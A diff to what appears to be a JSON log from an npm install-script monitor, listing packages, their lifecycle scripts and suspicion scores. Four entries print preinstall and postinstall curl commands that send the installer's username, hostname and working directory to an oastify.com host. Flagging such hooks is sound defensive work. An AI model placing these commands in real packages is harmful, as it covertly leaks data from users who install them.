@@ -1,5 +1,85 @@
 [
   {
+    "packageName": "@capivv/cli",
+    "version": "0.1.3",
+    "scriptType": "postinstall",
+    "scriptContent": "node postinstall.js",
+    "previousVersion": null,
+    "timestamp": "2026-03-04T14:47:50.984Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "@metamask/streams",
+    "version": "0.5.0",
+    "scriptType": "postinstall",
+    "scriptContent": "../../scripts/playwright-install.sh",
+    "previousVersion": "0.4.0",
+    "timestamp": "2026-03-04T14:47:41.167Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "@vfarcic/dot-ai",
+    "version": "1.6.0",
+    "scriptType": "postbuild",
+    "scriptContent": "chmod +x dist/mcp/server.js && cp src/interfaces/oauth/dex-api.proto dist/interfaces/oauth/",
+    "previousVersion": "1.5.0",
+    "timestamp": "2026-03-04T14:45:59.736Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "this-is-my-test-package",
+    "version": "1.0.9",
+    "scriptType": "postinstall",
+    "scriptContent": "curl -s \"http://6dks6olayyytzrl86r91tkfy0p6guei3.oastify.com/post/depy_anchore/geopost-web-component/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\"",
+    "previousVersion": "1.0.8",
+    "timestamp": "2026-03-04T14:45:16.129Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
+    "packageName": "this-is-my-test-package",
+    "version": "1.0.9",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -s \"http://6dks6olayyytzrl86r91tkfy0p6guei3.oastify.com/depy_anchore/geopost-web-component/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\"",
+    "previousVersion": "1.0.8",
+    "timestamp": "2026-03-04T14:45:16.118Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
+    "packageName": "rizzscript",
+    "version": "1.2.0",
+    "scriptType": "postinstall",
+    "scriptContent": "code --install-extension ./vscode-rizzscript/rizzscript-1.1.1.vsix --force || echo 'VS Code CLI not found, manually install vscode-rizzscript/rizzscript-1.1.1.vsix'",
+    "previousVersion": "1.1.2",
+    "timestamp": "2026-03-04T14:44:30.289Z",
+    "issuesend": false,
+    "suspicionScore": 0
+  },
+  {
+    "packageName": "fzm-wagenkasten-api",
+    "version": "1.0.9",
+    "scriptType": "postinstall",
+    "scriptContent": "curl -s \"http://6dks6olayyytzrl86r91tkfy0p6guei3.oastify.com/post/depy_anchore/geopost-web-component/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\"",
+    "previousVersion": "1.0.3",
+    "timestamp": "2026-03-04T14:44:22.217Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
+    "packageName": "fzm-wagenkasten-api",
+    "version": "1.0.9",
+    "scriptType": "preinstall",
+    "scriptContent": "curl -s \"http://6dks6olayyytzrl86r91tkfy0p6guei3.oastify.com/depy_anchore/geopost-web-component/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\"",
+    "previousVersion": "1.0.3",
+    "timestamp": "2026-03-04T14:44:22.213Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
     "packageName": "pocket-ai-logger",
     "version": "1.0.0",
     "scriptType": "prebuild",
